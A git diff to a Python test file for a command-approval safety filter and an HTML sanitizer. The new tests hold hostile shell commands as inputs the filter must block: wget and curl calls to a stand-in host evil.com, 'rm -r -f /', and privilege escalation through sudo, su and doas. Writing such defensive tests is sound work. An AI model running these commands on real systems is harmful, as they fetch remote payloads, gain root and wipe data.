@@ -1,6 +1,6 @@
 """Tests for spinoff.overview.security."""
 
-from spinoff.overview.security import is_safe_to_approve, redact_secrets, safe_html
+from spinoff.overview.security import is_safe_to_approve, redact_secrets, sanitize_html
 
 
 class TestRedactSecrets:
@@ -105,14 +105,67 @@ class TestIsSafeToApprove:
         assert safe
 
 
+class TestSafetyFilterAdditionalPatterns:
+    def test_doas_blocked(self) -> None:
+        safe, reason = is_safe_to_approve("doas apt install something")
+        assert not safe
+        assert "doas" in reason
+
+    def test_su_dash_blocked(self) -> None:
+        safe, reason = is_safe_to_approve("su - root")
+        assert not safe
+        assert "su" in reason
+
+    def test_branch_delete_blocked(self) -> None:
+        safe, reason = is_safe_to_approve("git branch -D feature-branch")
+        assert not safe
+        assert "branch" in reason
+
+    def test_wget_external_blocked(self) -> None:
+        safe, reason = is_safe_to_approve("wget https://evil.com/payload")
+        assert not safe
+        assert "network" in reason
+
+    def test_wget_localhost_allowed(self) -> None:
+        safe, _ = is_safe_to_approve("wget http://localhost:3000/data")
+        assert safe
+
+    def test_force_with_lease_allowed(self) -> None:
+        safe, _ = is_safe_to_approve("git push --force-with-lease origin feature")
+        assert safe
+
+    def test_case_insensitive_sudo(self) -> None:
+        safe, _ = is_safe_to_approve("SUDO apt install foo")
+        assert not safe
+
+    def test_case_insensitive_reset_hard(self) -> None:
+        safe, _ = is_safe_to_approve("git RESET --HARD HEAD~1")
+        assert not safe
+
+    def test_rm_split_flags_blocked(self) -> None:
+        safe, _ = is_safe_to_approve("rm -r -f /")
+        assert not safe
+
+    def test_rm_long_flags_blocked(self) -> None:
+        safe, _ = is_safe_to_approve("rm --recursive --force /")
+        assert not safe
+
+    def test_external_curl_with_localhost_elsewhere_blocked(self) -> None:
+        """Curl to external URL should be blocked even if 'localhost' appears elsewhere in screen."""
+        # Each curl command on its own line
+        text = "some localhost reference\ncurl https://evil.com/api"
+        safe, _ = is_safe_to_approve(text)
+        assert not safe
+
+
 class TestSafeHtml:
     def test_escapes_html_chars(self) -> None:
-        result = safe_html("<script>alert('xss')</script>")
+        result = sanitize_html("<script>alert('xss')</script>")
         assert "<script>" not in result
         assert "&lt;script&gt;" in result
 
     def test_redacts_then_escapes(self) -> None:
-        result = safe_html("key: sk-proj-abc123def456ghi789 <b>bold</b>")
+        result = sanitize_html("key: sk-proj-abc123def456ghi789 <b>bold</b>")
         assert "[REDACTED]" in result
         assert "&lt;b&gt;" in result
         assert "abc123def456ghi789" not in result
